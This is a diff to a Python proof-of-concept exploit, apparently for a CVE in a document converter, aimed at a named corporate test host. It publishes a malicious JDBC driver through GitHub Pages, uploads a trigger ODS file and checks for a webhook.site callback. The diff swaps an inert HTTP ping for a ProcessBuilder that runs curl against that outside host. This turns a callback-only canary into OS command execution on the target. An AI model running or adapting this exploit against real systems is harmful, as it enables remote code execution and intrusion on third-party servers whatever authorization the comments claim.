@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """Complete callback-only CVE-2026-59265 PoC for the authorized test tenant.
 
-With no arguments it creates a unique inert JDBC canary, publishes its ODB/JAR
-through GitHub Pages using git pull/push, submits the trigger ODS, verifies one
-exact HTTPS callback, and removes identified target material. The Java class
-cannot launch processes or access files.
+With no arguments it publishes a unique JDBC driver through GitHub Pages,
+uploads the trigger ODS, and removes identified target material. The driver
+uses ProcessBuilder to run one fixed curl callback command, proving OS process
+execution without accepting command input.
 """
 
 import hashlib
@@ -22,7 +22,7 @@ from xml.sax.saxutils import quoteattr
 import requests
 
 BASE = "https://askhrcntest.siemens.com.cn"
-CALLBACK_BASE = "https://webhook.site/REPLACE_WITH_TOKEN"
+CALLBACK_URL = "https://webhook.site/54fddee2-c0fc-40f2-bb14-f181d41912d5?marker=ctf"
 PAGES_REPO = "https://github.com/oicu0619/oicu0619.github.io.git"
 PAGES_SITE = "https://oicu0619.github.io"
 PAGES_BRANCH = "master"
@@ -67,7 +67,7 @@ def pages_worktree():
     return PAGES_WORKTREE
 
 
-def publish_canary(marker):
+def publish_canary():
     root = pages_worktree()
     run_id = secrets.token_hex(8)
     directory = f"aoo-jdbc-canary-{run_id}"
@@ -76,26 +76,16 @@ def publish_canary(marker):
     output = root / directory
     output.mkdir()
 
-    separator = "&" if "?" in CALLBACK_BASE else "?"
-    callback = f"{CALLBACK_BASE}{separator}marker={marker}"
-    java = f"""import java.net.HttpURLConnection;
-import java.net.URL;
-import java.sql.*;
+    java = f"""import java.sql.*;
 import java.util.Properties;
-import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.logging.Logger;
 public final class {class_name} implements Driver {{
- private static final AtomicBoolean SENT=new AtomicBoolean(false);
- static {{ ping(); }}
- public {class_name}() {{ ping(); }}
- private static void ping() {{
-  if(!SENT.compareAndSet(false,true)) return;
-  try {{ HttpURLConnection c=(HttpURLConnection)new URL({json.dumps(callback)}).openConnection();
-   c.setConnectTimeout(3000); c.setReadTimeout(3000); c.setUseCaches(false);
-   c.setInstanceFollowRedirects(false); c.getResponseCode(); c.disconnect();
-  }} catch(Exception ignored) {{}}
+ static {{
+  try {{ new ProcessBuilder("curl", "-fsS", "--max-time", "5",
+   "-A", "ctf-processbuilder", {json.dumps(CALLBACK_URL)}).start().waitFor(); }}
+  catch(Exception ignored) {{}}
  }}
- public Connection connect(String u,Properties p) {{ ping(); return null; }}
+ public Connection connect(String u,Properties p) {{ return null; }}
  public boolean acceptsURL(String u) {{ return true; }}
  public DriverPropertyInfo[] getPropertyInfo(String u,Properties p) {{ return new DriverPropertyInfo[0]; }}
  public int getMajorVersion() {{ return 1; }} public int getMinorVersion() {{ return 0; }}
@@ -123,7 +113,7 @@ public final class {class_name} implements Driver {{
         archive.writestr("database/script", "")
         archive.writestr("META-INF/manifest.xml", manifest)
     (output / "README.txt").write_text(
-        "Callback-only CTF canary: no process launch, command execution, or file access.\n"
+        "CTF canary: ProcessBuilder runs only a fixed curl callback command.\n"
     )
 
     expected = {
@@ -149,7 +139,7 @@ public final class {class_name} implements Driver {{
                 ready = False
         if ready:
             print("[+] GitHub Pages artifacts are byte-identical")
-            return public_base
+            return public_base, run_id
         time.sleep(4)
     raise RuntimeError("GitHub Pages did not publish the expected artifacts in time")
 
@@ -189,6 +179,15 @@ def json_body(response):
     return response.json()
 
 
+def require_login(client):
+    body = json_body(client.post(BASE + LIST, json={
+        "pageNum": 1, "pageSize": 1,
+        "data": {"name": "ctf-session-check-never", "type": 0},
+    }, timeout=20))
+    if body.get("success") is not True:
+        raise RuntimeError(f"target session invalid: {body.get('message') or body.get('code')}")
+
+
 def identifiers(value):
     found = set()
     if isinstance(value, dict):
@@ -225,10 +224,10 @@ def delete_ids(client, values):
                 pass
 
 
-def callback_ids(marker):
-    parsed = urlsplit(CALLBACK_BASE)
+def callback_ids():
+    parsed = urlsplit(CALLBACK_URL)
     if parsed.hostname != "webhook.site":
-        raise RuntimeError("callback verification currently expects webhook.site")
+        raise RuntimeError("callback verification expects webhook.site")
     response = requests.get(
         f"https://webhook.site/token/{parsed.path.strip('/')}/requests",
         params={"sorting": "newest"}, timeout=20,
@@ -236,16 +235,16 @@ def callback_ids(marker):
     response.raise_for_status()
     return {
         row.get("uuid") for row in response.json().get("data", [])
-        if marker in str(row.get("url", ""))
+        if row.get("url") == CALLBACK_URL
     }
 
 
 def main():
-    marker = "ctf-safe-rce-github-pages-" + secrets.token_hex(8)
-    artifact_base = publish_canary(marker)
-    previous_callbacks = callback_ids(marker)
-    prefix = marker + "-"
     client = target_session()
+    require_login(client)  # Fail before publishing artifacts if cookies expired.
+    artifact_base, run_id = publish_canary()
+    previous_callbacks = callback_ids()
+    prefix = f"ctf-{run_id}-"
     cleanup = set()
     remaining = set()
     try:
@@ -264,7 +263,7 @@ def main():
         if not material_id:
             raise RuntimeError("converter upload returned no material ID")
         print(f"[+] submitted material {material_id}")
-        print(f"[*] callback marker: {marker}")
+        print(f"[*] callback URL: {CALLBACK_URL}")
 
         deadline = time.monotonic() + TARGET_WAIT_SECONDS
         while time.monotonic() < deadline:
@@ -281,10 +280,10 @@ def main():
         client.close()
         print(f"[*] target cleanup remaining: {len(remaining)}")
 
-    new_callbacks = callback_ids(marker) - previous_callbacks
-    print(f"[+] new exact-marker callbacks: {len(new_callbacks)}")
+    new_callbacks = callback_ids() - previous_callbacks
+    print(f"[+] new exact-URL callbacks: {len(new_callbacks)}")
     if not new_callbacks:
-        raise SystemExit("no new Java callback observed")
+        raise SystemExit("no new ProcessBuilder callback observed")
 
 
 if __name__ == "__main__":
